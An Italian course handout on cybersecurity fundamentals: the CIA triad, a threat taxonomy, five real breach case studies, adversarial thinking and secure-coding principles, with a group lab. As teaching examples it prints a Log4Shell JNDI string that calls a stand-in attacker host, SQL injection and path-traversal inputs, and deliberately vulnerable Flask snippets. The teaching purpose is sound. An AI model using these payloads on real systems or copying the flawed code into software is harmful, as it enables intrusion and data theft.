# Modulo M1 — Fondamenti di Cybersecurity

**Dispensa Tecnica — Corso ITS Cybersecurity (32h)**
**Modulo 1 — 4 ore (3h teoria + 1h lab a coppie)**
**Prerequisiti**: nessuno. M0 completato (ambiente funzionante).

> Questo materiale **integra e adatta a 4h** il Capitolo 1 della dispensa principale `dispensa-sviluppo-sicuro-software.docx`. Aggiunge: CIA Triad estesa, tassonomia minacce strutturata, 5 casi reali raccontati come storie.

---

## Indice

- [Capitolo 1 — Sicurezza informatica vs sicurezza del software](#cap1)
- [Capitolo 2 — La CIA Triad (e i suoi 3 fratelli)](#cap2)
- [Capitolo 3 — Tassonomia delle minacce](#cap3)
- [Capitolo 4 — Cinque casi reali](#cap4)
- [Capitolo 5 — La mentalità avversaria](#cap5)
- [Capitolo 6 — I 5 principi del Secure Coding](#cap6)
- [Capitolo 7 — Lab — Cosa è andato storto?](#cap7)

---

<a name="cap1"></a>
## Capitolo 1 — Sicurezza informatica vs sicurezza del software

> Quanto ci vorrà: 30 minuti.

### 1.1 Due cose diverse che la stampa chiama "cybersecurity"

Quando il telegiornale dice "attacco hacker a una banca", potrebbe parlare di due cose molto diverse.

**Caso A — Sicurezza informatica (perimetrale, infrastrutturale)**
L'attaccante entra **dalla rete**. Sfrutta firewall mal configurati, VPN bucate, server esposti, password deboli su SSH, accessi RDP non protetti.

Chi previene: **sistemisti, amministratori di rete, responsabili IT**.

**Caso B — Sicurezza del software (applicazioni, codice)**
L'attaccante non "entra" — manda una richiesta legittima all'applicazione, ma con dati malevoli. Es: una SQL Injection nel form di login.

Chi previene: **sviluppatori, architetti software**.

### 1.2 Perché distinguerle

Confonderle porta a errori sistematici:

> "Abbiamo il firewall, siamo a posto."

Falso. Il firewall protegge dal Caso A. Una SQL Injection passa dal **firewall** che la fa passare perché è una richiesta HTTP legittima sulla porta 443. Lo SQLi entra nell'app **attraverso** la porta che il firewall lascia aperta apposta.

> "Abbiamo HTTPS, siamo a posto."

Falso. HTTPS cifra il **canale**. Se l'app dentro è vulnerabile a SQL Injection, l'attaccante manda l'attacco *cifrato* e funziona uguale.

### 1.3 Questo corso parla di entrambe

In 32 ore tocchiamo entrambi i fronti, ma con questa proporzione:

| Tema | Modulo | Ore |
|------|--------|-----|
| Sicurezza informatica (rete, protocolli, OS) | M2, parte di M5 | ~7h |
| Sicurezza del software (codice, applicazioni) | M3, M5, M6, M7 | ~18h |
| Trasversale (concetti, normativa) | M1, M4 | ~6h |

La maggior parte del tempo è sul **codice**. Perché è dove i discenti — futuri sviluppatori — possono fare la differenza.

---

<a name="cap2"></a>
## Capitolo 2 — La CIA Triad (e i suoi 3 fratelli)

> Quanto ci vorrà: 30 minuti.

### 2.1 Cos'è "essere sicuri"

In informatica "sicurezza" non è un'unica cosa. È la conservazione di **proprietà** misurabili. Le 3 fondamentali si chiamano **CIA Triad**:

**C — Confidentiality** (Riservatezza)
I dati sono visibili solo a chi è autorizzato.
Violazione: estrazione DB, sniffing, accesso non autorizzato.

**I — Integrity** (Integrità)
I dati non sono modificati senza autorizzazione.
Violazione: manomissione di un cookie, alterazione di un bonifico, modifica di un log.

**A — Availability** (Disponibilità)
Il sistema è disponibile quando serve.
Violazione: DDoS, ransomware, blackout.

### 2.2 Esempi concreti per ogni proprietà

| Caso | Proprietà violata |
|------|-------------------|
| Equifax 2017 — 147M record rubati | **C** (Confidentiality) |
| Bonifico modificato in transito (MITM) | **I** (Integrity) |
| WannaCry 2017 — ospedali UK bloccati | **A** (Availability) |
| Phishing → password rubata → login | **C** (perché ora l'attaccante vede dati) |
| Defacing di un sito (homepage modificata) | **I** |
| SYN flood che mette KO un server | **A** |

### 2.3 I 3 fratelli (estensione)

CIA è la triade classica del 1986. Negli anni si sono aggiunti 3 concetti che oggi sono altrettanto importanti:

**Authenticity** (Autenticità)
L'identità dichiarata è verificabile. Sei davvero tu?

**Non-repudiation** (Non-ripudio)
Chi ha fatto un'azione non può negarla dopo. Hai firmato il bonifico, non puoi dire "non sono stato io".

**Accountability** (Responsabilità tracciabile)
Le azioni sono tracciate e attribuibili. C'è un audit trail.

### 2.4 Quando applicare CIA: la matrice

A design time, per ogni tipologia di dato, chiediti **quale proprietà conta di più**:

| Dato | C | I | A |
|------|---|---|---|
| Saldo conto corrente | 🔥 alta | 🔥 alta | 🔥 alta |
| Password utenti | 🔥 critica | 🔥 critica | bassa |
| Log di sistema | media | 🔥 critica | media |
| Pagina pubblica "chi siamo" | bassa | 🔥 critica (defacing) | media |
| Catalogo prodotti e-commerce | bassa | media | 🔥 critica |

Questa matrice (anche grezza) ti aiuta a capire **dove investire** in sicurezza.

---

<a name="cap3"></a>
## Capitolo 3 — Tassonomia delle minacce

> Quanto ci vorrà: 45 minuti.

### 3.1 Le 8 categorie di minacce

Per non perdersi, raggruppiamo le minacce in 8 categorie. Per ognuna: cos'è, esempio, chi/cosa la previene.

#### 1. Malware

Software dannoso che gira sulla macchina vittima. Sotto-categorie:

- **Virus**: si attacca a file legittimi e si propaga eseguendoli.
- **Worm**: si propaga da solo via rete senza interazione utente.
- **Trojan**: si traveste da software legittimo.
- **Ransomware**: cifra i file e chiede riscatto. Casi: WannaCry 2017, NotPetya 2017, Colonial Pipeline 2021.
- **Spyware**: ruba dati silenziosamente. Casi: Pegasus.
- **Rootkit**: si nasconde nel kernel del sistema operativo.
- **Botnet**: malware che mette il PC infettato sotto controllo remoto, spesso per attacchi DDoS coordinati.

**Difesa primaria**: antivirus aggiornato, **non eseguire allegati** sospetti, EDR/XDR aziendali, patching.

#### 2. Phishing e Social Engineering

L'attaccante ti convince a fare qualcosa che non dovresti. Tecnologia minimale, **psicologia massimale**.

Sotto-categorie:
- **Phishing**: email che imita una banca/servizio per rubare password.
- **Spear phishing**: phishing mirato a una persona specifica (più personalizzato).
- **Whaling**: spear phishing al CEO/CFO.
- **Vishing**: phishing telefonico.
- **Smishing**: phishing via SMS.
- **Pretexting**: l'attaccante si finge un collega/tecnico per ottenere info.
- **Baiting**: lasciare USB infette nel parcheggio aziendale.

**Difesa**: formazione utenti, MFA (anche se la password viene rubata, l'attaccante non ha il secondo fattore), email filtering.

#### 3. Man-in-the-Middle (MITM)

L'attaccante si interpone tra due comunicanti. Vede e/o modifica i messaggi.

Tecniche: ARP spoofing (M2), DNS spoofing, Wi-Fi rogue (rete fake "Free WiFi" all'aeroporto), certificate spoofing.

**Difesa**: HTTPS con certificate pinning, HSTS, VPN aziendale, Wi-Fi solo trusted.

#### 4. DoS / DDoS

Rendere indisponibile il servizio. Volumetrico (saturare banda) o applicativo (esaurire risorse server).

DDoS = "distributed", da migliaia di macchine (botnet).

**Difesa**: rate limiting, anti-DDoS (Cloudflare, AWS Shield), architettura scalabile.

#### 5. Web Application Attacks

Il cuore di questo corso. Sono i 10 della **OWASP Top 10**:

- SQL Injection (M6.2)
- Broken Access Control / IDOR (M6.3)
- Cryptographic Failures (M6.4)
- Cross-Site Scripting / XSS (M6.5)
- Vulnerable Components / Supply Chain (M6.6)
- Path Traversal (M6.7)
- Server-Side Request Forgery (SSRF)
- CSRF
- Insecure Deserialization
- Security Misconfiguration

Li vedremo tutti (i primi 5 in profondità).

**Difesa**: codice sicuro. Punto. Il WAF aiuta ma non basta.

#### 6. Supply Chain Attacks

Compromettere il software a monte: una libreria che migliaia di aziende usano.

Casi:
- **SolarWinds 2020**: malware in un aggiornamento di Orion. ~18000 organizzazioni infette.
- **Log4Shell 2021**: vulnerabilità in Log4j (libreria Java ovunque). CVSS 10.0.
- **XZ Utils 2024**: backdoor in una libreria di compressione, scoperta per caso prima del rilascio massivo.

**Difesa**: SBOM, dependency scanning, verifica firme, principio di "minimo numero di dipendenze".

#### 7. Zero-Day

Vulnerabilità sconosciuta al vendor (e quindi senza patch). L'attaccante la sfrutta prima che la community la scopra.

Mercato: i broker di zero-day pagano centinaia di migliaia di dollari per vulnerabilità ad alto impatto (es. iOS RCE).

**Difesa**: difese in profondità, monitoring, patching rapido **dopo la disclosure**.

#### 8. Insider Threat

Minaccia che viene da dentro. Dipendente scontento, ex-dipendente con credenziali ancora attive, infiltrato.

Casi: Edward Snowden 2013 (esfiltrazione massiva NSA), molti casi di sabotaggio post-licenziamento.

**Difesa**: least privilege rigoroso, separation of duties, revoca tempestiva accessi, monitoring comportamentale.

### 3.2 Tabella riassuntiva

| Categoria | Vettore | Bersaglio tipico | Difesa primaria |
|-----------|---------|-------------------|-----------------|
| Malware | Email, USB, drive-by | Endpoint utente | Antivirus, EDR |
| Phishing | Email/SMS/voce | Persone | Formazione, MFA |
| MITM | Rete | Comunicazioni | HTTPS, VPN |
| DoS/DDoS | Rete | Servizio | Rate limit, anti-DDoS |
| Web App | HTTP | Applicazioni | Codice sicuro |
| Supply Chain | Dipendenze | Tutti | SBOM, scanning |
| Zero-Day | Variabile | Variabile | Defense in depth |
| Insider | Accesso legittimo | Dati interni | Least priv, audit |

---

<a name="cap4"></a>
## Capitolo 4 — Cinque casi reali

> Quanto ci vorrà: 30 minuti. Storytelling, niente diapositive.

Questi 5 casi vanno raccontati come **storie**, non come liste di fatti. Per ognuno: cosa è successo, come è successo, cosa si poteva fare.

### 4.1 Equifax 2017 — 147 milioni di record

**Cosa è successo**: Equifax (agenzia di credito USA) subisce un attacco tra maggio e luglio 2017. Rubati nomi, SSN, date di nascita, indirizzi, in alcuni casi numeri di carta.

**Come è successo**: Apache Struts (framework Java) aveva CVE-2017-5638 con CVSS 10.0, patchata a marzo 2017. Equifax non ha installato la patch per ~2 mesi.

**Cosa si poteva fare**:
- Inventario centrale delle dipendenze (SBOM).
- Processo automatico di scansione vulnerabilità.
- Patching SLA per CVE critiche (es. ≤7 giorni per CVSS ≥9.0).
- Network segmentation (anche penetrato il front-end, l'attaccante non sarebbe arrivato al DB).

**Lezione**: la sicurezza non è il momento dell'attacco, è la routine quotidiana che ti tiene aggiornato.

### 4.2 Heartbleed 2014 — la libreria di tutti

**Cosa è successo**: bug in OpenSSL (CVE-2014-0160, "Heartbleed") permetteva di leggere 64KB di memoria del server per ogni richiesta. Tra cui chiavi private, password in chiaro, sessioni.

**Come è successo**: bug nel codice di OpenSSL — mancato controllo della lunghezza nel "heartbeat" TLS. La memoria che doveva tornare era 16 bytes, l'attaccante chiedeva 64KB e il server li dava.

**Impatto**: ~17% dei server HTTPS al mondo (mezzo milione+). Yahoo, Pinterest, Reddit, persino Canada Revenue Agency.

**Cosa si poteva fare**:
- Code review accurato (open source, ma poche persone leggevano OpenSSL davvero).
- Fuzzing automatizzato (avrebbe trovato il bug).
- **Diversificazione**: non tutto su OpenSSL. Esistevano alternative (BoringSSL, LibreSSL nato proprio dopo Heartbleed).
- Memoria sicura: linguaggi che non permettono questo tipo di overflow (Rust, Go).

**Lezione**: una libreria usata da tutti è un single point of failure colossale.

### 4.3 Target 2013 — il fornitore HVAC

**Cosa è successo**: Target (catena retail USA) si fa rubare 40M numeri di carta + 70M record di clienti durante il Black Friday 2013.

**Come è successo**: l'attaccante non ha bucato Target direttamente. Ha bucato **un fornitore HVAC** (climatizzazione) che aveva accesso di rete a Target per il monitoraggio remoto. Da lì ha pivotato fino ai POS dei negozi e installato malware che leggeva le carte mentre venivano strisciate.

**Cosa si poteva fare**:
- Network segmentation: il sistema HVAC **non doveva** poter parlare con la rete dei POS.
- Least privilege per i fornitori.
- MFA sui canali di accesso esterni.
- Monitoring del traffico est-ovest (laterale).

**Lezione**: il tuo perimetro è grande quanto il perimetro del tuo fornitore più debole.

### 4.4 SolarWinds 2020 — la supply chain

**Cosa è successo**: gli aggiornamenti di SolarWinds Orion (software di monitoraggio rete usato da migliaia di aziende e agenzie USA) erano stati compromessi. ~18000 organizzazioni hanno installato un aggiornamento legittimamente firmato che però conteneva una backdoor.

**Come è successo**: l'attaccante (gruppo APT, ritenuto russo) si è infiltrato nel build server di SolarWinds e ha modificato il processo di build per iniettare codice malevolo nel binario, dopo la firma. Tutto era validato e firmato — ma firmato con una pipeline compromessa.

**Cosa si poteva fare**:
- Build reproducibili e isolati.
- Hash hash di sorgente confrontati con hash binario.
- Detection comportamentale (Orion che faceva richieste DNS strane).
- Zero-trust al livello di "non fidarsi nemmeno del proprio software firmato".

**Lezione**: la firma digitale non è sufficiente se la pipeline che la produce è compromessa.

### 4.5 Log4Shell 2021 — un log che esegue codice

**Cosa è successo**: 9 dicembre 2021, viene pubblicato CVE-2021-44228 in Log4j (libreria di logging Java usata praticamente ovunque). CVSS 10.0. Internet va in panico per 2 settimane.

**Come è successo**: Log4j aveva una "feature" che permetteva di interpolare stringhe come `${jndi:ldap://attacker.com/exploit}` nei messaggi di log. Se un attaccante riusciva a far loggare quella stringa al server (es. mettendola nel User-Agent), il server scaricava codice da `attacker.com` e lo eseguiva. **Remote Code Execution con un campo User-Agent**.

**Impatto**: ~10% di tutti i server enterprise al mondo erano vulnerabili.

**Cosa si poteva fare**:
- Principio di minima funzionalità: una libreria di logging non dovrebbe interpretare comandi remoti. Mai.
- Sandboxing dei processi.
- Egress filtering (un server web non dovrebbe scaricare jar arbitrari da Internet).
- Risposta rapida: chi aveva SBOM, ha trovato Log4j in 5 minuti. Chi non l'aveva, ha cercato per settimane.

**Lezione**: meno features = meno superficie di attacco. KISS è un principio di sicurezza.

---

<a name="cap5"></a>
## Capitolo 5 — La mentalità avversaria

> Quanto ci vorrà: 30 minuti.

### 5.1 Cosa significa "pensare come un attaccante"

Quando guardi del codice come sviluppatore, ti chiedi: **"fa quello che deve fare?"**. Test funzionali, casi happy path, alcuni edge case.

Quando guardi del codice come attaccante, ti chiedi: **"cosa fa che non dovrebbe fare?"**.

Sembrano la stessa cosa. Non lo sono.

### 5.2 Esempio guidato — un form di login

```python
@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    user = User.query.filter_by(username=username).first()
    if user and user.password == password:
        session["user_id"] = user.id
        return redirect("/dashboard")
    return "Login fallito", 401
```

**Sviluppatore (mindset funzionale)**:
- Test 1: `username=mario`, `password=segreta` → entra ✅
- Test 2: `username=mario`, `password=sbagliata` → 401 ✅
- Test 3: `username=non_esiste`, `password=qualunque` → 401 ✅
- "Funziona, va bene."

**Attaccante (mindset avversariale)**:
- E se metto `username=' OR '1'='1`? — SQL Injection (M6.2)
- E se metto un username molto lungo? — DoS / buffer overflow (in Python no, ma in C sì)
- E se cambio il metodo HTTP da POST a GET? — Username e password finiscono nell'URL e nei log
- E se faccio 1 milione di tentativi al secondo? — Brute force, manca rate limit
- E se le password nel DB sono in chiaro? — Data breach catastrofico (M6.4)
- E se l'errore "Login fallito" mi dice se l'utente esiste o no (timing attack)? — User enumeration
- E se modifico `session["user_id"]` lato client? — Privilege escalation (M6.3)

**Sette domande**, in 2 minuti, **sette potenziali vulnerabilità**. E questo è solo il login.

### 5.3 Esercitazione di gruppo (15 min)

Il docente proietta uno snippet a scelta tra:

```python
# Snippet A — endpoint che serve file
@app.route("/download")
def download():
    filename = request.args.get("file")
    return send_file(f"./uploads/{filename}")
```

```python
# Snippet B — endpoint che mostra una fattura
@app.route("/fattura/<int:id>")
def fattura(id):
    f = Fattura.query.get(id)
    return render_template("fattura.html", fattura=f)
```

```python
# Snippet C — endpoint di ricerca
@app.route("/cerca")
def cerca():
    q = request.args.get("q", "")
    sql = f"SELECT * FROM prodotti WHERE nome LIKE '%{q}%'"
    return jsonify(db.execute(sql).fetchall())
```

**Consegna**: per ogni snippet, **5 minuti** di brainstorming a coppie. "Cosa farebbe un attaccante?". Almeno 3 attacchi per snippet.

**Discussione collettiva** (15 min): le coppie espongono. Il docente fa il "feed" facendo domande tipo:

- "E se l'utente è autenticato, ma non è il proprietario di questa fattura?"
- "E se metto come `file` la stringa `../etc/passwd`?"
- "E se cerco `'; DROP TABLE prodotti; --`?"

### 5.4 Il valore della mentalità avversaria

> "Il design sicuro non si misura dalla lista di cose che il sistema fa. Si misura dalla lista di cose che il sistema **non lascia fare**."

Il resto del corso (M2, M5, M6) ti darà strumenti strutturati per applicare questa mentalità: STRIDE (M5), OWASP Top 10 (M6). Ma il punto di partenza è sempre questa domanda: **cosa fa che non dovrebbe fare?**

---

<a name="cap6"></a>
## Capitolo 6 — I 5 principi del Secure Coding

> Quanto ci vorrà: 30 minuti.

Sono i pilastri che riprenderemo in tutto il corso. Memorizzali.

### 6.1 Least Privilege — Minimo Privilegio

Ogni componente deve avere **il minimo privilegio necessario** per fare il suo lavoro.

**Esempi positivi**:
- L'utente del DB usato dalla webapp ha solo SELECT/INSERT/UPDATE sulle sue tabelle. Non DROP, non GRANT.
- Il container Docker non gira come root.
- L'API key per servizio X ha permessi solo per X, non per tutta l'organizzazione.

**Esempi negativi**:
- App Flask che gira come root (mai).
- Account "service" con permessi DBA full sul DB di produzione.
- API key di Slack con permessi `admin` quando serve solo "scrivi su un canale".

### 6.2 Defense in Depth — Difesa in Profondità

**Mai una difesa sola**. Più strati di sicurezza indipendenti, in modo che bucarne uno non comprometta tutto.

**Esempio positivo (login utente)**:
- Strato 1: TLS (canale cifrato)
- Strato 2: rate limiting (max 5 tentativi/min)
- Strato 3: bcrypt sulle password (anche se il DB viene rubato, le password non sono utilizzabili subito)
- Strato 4: MFA (anche con password rubata, serve secondo fattore)
- Strato 5: monitoring (alert su login da paesi inusuali)

Bucare uno solo (es. TLS) non basta all'attaccante.

**Esempio negativo**: "abbiamo HTTPS, basta così". No.

### 6.3 Fail Secure — Quando si rompe, si chiude

Quando un componente fallisce, il sistema deve cadere in uno stato **sicuro**, non aperto.

**Esempi positivi**:
- Se il check di autorizzazione lancia eccezione → nega l'accesso (default deny).
- Se la cifratura fallisce → non salvare in chiaro come fallback.
- Se il certificato del server è invalido → blocca, non procedere "per cortesia".

**Esempi negativi (Fail Open)**:

```python
# ANTI-PATTERN: fail open
try:
    if not is_authorized(user, resource):
        return 403
    return resource
except:
    return resource  # ❌ se il check si rompe, dai accesso lo stesso
```

Se `is_authorized` lancia eccezione, l'utente entra. **Fail open** — è il bug peggiore.

**Pattern corretto (fail secure)**:
```python
try:
    if not is_authorized(user, resource):
        return 403
    return resource
except Exception as e:
    log.error(f"Auth check failed: {e}")
    return 503  # ✅ servizio non disponibile, non accesso non autorizzato
```

### 6.4 KISS — Keep It Simple, Stupid

La complessità è la nemica della sicurezza. Più codice = più bug = più vulnerabilità.

**Caso di scuola**: Log4Shell. Una libreria di logging che eseguiva codice remoto. Perché logging deve eseguire codice? **Non deve.** Era una feature complessa (interpolazione JNDI) che ha aperto un buco gigantesco.

**In pratica**:
- Meno dipendenze.
- Meno feature opzionali abilitate di default.
- Meno indirezioni.
- Codice leggibile da un altro umano in 5 minuti.

### 6.5 Separation of Duties — Separazione dei Compiti

Nessuna singola persona/componente dovrebbe poter completare un'azione critica da solo.

**Esempi**:
- Per fare un bonifico > 10000€ servono **due approvatori**.
- Chi scrive il codice non è chi fa il deploy in produzione.
- Le chiavi di backup sono in un cassaforte separata da quelle di lavoro.

In codice:
- Audit log scritto su un sistema separato (un attaccante che compromette l'app non può cancellare le tracce).
- Chiavi di cifratura in un KMS, non nel codice.

### 6.6 Riassunto in una pagina

| Principio | In una frase | Tipico anti-pattern |
|-----------|-------------|----------------------|
| Least Privilege | Solo ciò che serve | App che gira come root |
| Defense in Depth | Più strati indipendenti | "Abbiamo HTTPS basta" |
| Fail Secure | Se si rompe, chiude | Try/except che ignora errori auth |
| KISS | Meno è più | Feature opzionali abilitate di default |
| Separation of Duties | Mai uno solo | Stesso utente DB dev e prod |

---

<a name="cap7"></a>
## Capitolo 7 — Lab — Cosa è andato storto?

> Quanto ci vorrà: 1 ora (20 min preparazione, 30 min lavoro, 10 min discussione).

### 7.1 Setup

**Coppie**. Ogni coppia sceglie **uno** dei 5 casi visti in cap. 4 (oppure ne propone uno tra: Yahoo 2013-14, OPM 2015, Marriott 2018, Capital One 2019, Twitter 2020 — il docente fornisce link).

### 7.2 Consegna

**Documento di 1 pagina** in formato libero (Word/Markdown/PDF) con **5 sezioni**:

1. **Riassunto** (3-4 righe): cosa è successo, quando, chi è stato colpito.
2. **CIA**: quale proprietà è stata violata? (Anche più di una.)
3. **Tassonomia**: quale categoria di minaccia (cap. 3)?
4. **Principio violato**: quale dei 5 principi (cap. 6) è stato ignorato?
5. **Misura tecnica concreta** che avrebbe evitato (o limitato) l'incidente. Una sola, specifica.

Tempo: **30 minuti**. È normale dover cercare un po' su internet per i dettagli.

### 7.3 Discussione collettiva (10 min)

Ogni coppia espone in **2 minuti**:
- Qual è il caso scelto.
- Quale CIA + tassonomia + principio.
- La misura tecnica.

Il docente sintetizza alla lavagna. Quasi sempre emerge che:
- Le proprietà violate sono **C** + **A** (data breach + downtime).
- Il principio violato è quasi sempre **Defense in Depth** o **Least Privilege**.
- Le misure proposte sono spesso "patching tempestivo" o "segmentazione di rete".

### 7.4 Output

Le consegne vanno in `Corso_32h/04_consegne/M1_lab/`. Non sono valutate (M1 non ha verifica formale), ma il docente le legge e ne discute con la classe nelle pause di M2.

---

**Prossimo modulo**: M2 — Networking & ISO/OSI (6h). Adesso sai cos'è la cybersecurity. Il prossimo passo è capire **come funziona la rete**, perché è il primo terreno di gioco di un attaccante.
